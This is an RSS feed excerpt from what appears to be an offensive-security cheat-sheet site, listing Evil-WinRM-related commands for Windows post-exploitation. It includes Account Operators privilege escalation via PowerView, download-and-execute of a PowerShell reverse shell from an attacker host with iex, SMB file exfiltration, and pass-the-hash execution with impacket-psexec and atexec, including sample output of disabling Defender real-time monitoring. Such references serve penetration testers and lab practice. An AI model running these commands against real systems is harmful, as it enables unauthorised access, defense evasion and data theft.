channel.title: Evil-Winrm on TLDRBins
channel.description: Recent content in Evil-Winrm on TLDRBins

item.title: Account Operators
item.description: Privesc #1: Create a New User Account and Add it to LAPS (Local Administrator Password Solution) Group Windows 1. Import PowerView.ps1 . .\PowerView.ps1 *Evil-WinRM* PS C:\programdata> . .\PowerView.ps1 2. Create a Cred Object (Runas) [Optional] $username = '<DOMAIN>\<USER>' $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Create a New User Password Object $new_user_password = ConvertTo-SecureString '<NEW_USER_PASSWORD>' -AsPlainText -Force *Evil-WinRM* PS C:\programdata> $new_user_password = ConvertTo-SecureString 'Test1234' -AsPlainText -Force 4.

item.title: File Transfer (Linux to Windows)
item.description: powershell cmd evil-winrm Start a Local HTTP Server python3 -m http.server <LOCAL_PORT> $ python3 -m http.server 8443 Serving HTTP on 0.0.0.0 port 8443 (http://0.0.0.0:8443/) ... # Invoke-WebRequest iwr http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> -o C:\ProgramData\<FILE> # Wget powershell -ep bypass wget <LOCAL_IP>:<LOCAL_PORT>/<FILE> -Outfile C:\ProgramData\<FILE> # Curl powershell -ep bypass curl <LOCAL_IP>:<LOCAL_PORT>/<FILE> -Outfile C:\ProgramData\<FILE> Note: curl and wget are alias to Invoke-WebRequest # Load into memory and run # Invoke-Expression iex (New-Object Net.WebClient).DownloadString('http://<LOCAL_IP>:<LOCAL_PORT>/<FILE>');Invoke-PowerShellTcp -Reverse -IPAddress <LOCAL_IP> -Port <LOCAL_PORT> # Short version iex (iwr http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> -UseBasicParsing) Ref: rev.

item.title: File Transfer (Windows To Linux)
item.description: SMB Base64 evil-winrm Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\<LOCAL_IP>\share # Connect to SMB server with creds net use \\<LOCAL_IP>\share /u:<USER> '<PASSWORD>' # From target Windows to local Linux copy <FILE> \\<LOCAL_IP>\share # From local Linux to target Windows copy \\<LOCAL_IP>\share\<FILE> <FILE> # Delete file del <FILE> # Remove SMB share net use /d \\<LOCAL_IP>\share # Older Windows (e.

item.title: Winrm
item.description: PsExec Password NTLM # Domain auth impacket-psexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' # Local auth impacket-psexec '<USER>:<PASSWORD>@<TARGET>' # Domain auth impacket-psexec '<DOMAIN>/<USER>@<TARGET>' -hashes :<HASH> # Local auth impacket-psexec '<USER>@<TARGET>' -hashes :<HASH> AtExec Password NTLM # Local auth impacket-atexec '<WORKGROUP>/<USER>:<PASSWORD>@<TARGET_DOMAIN>' 'powershell.exe -c "<CMD>"' # Local auth impacket-atexec '<WORKGROUP>/<USER>@<TARGET_DOMAIN>' -hashes :<HASH> 'powershell.exe -c "<CMD>"' $ impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 'WS01/administrator@WS01.example.com' 'powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true"' Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [!] This will work ONLY on Windows >= Vista [*] Creating task \gNBJCrJi [*] Running task \gNBJCrJi [*] Deleting task \gNBJCrJi [*] Attempting to read ADMIN$\Temp\gNBJCrJi.
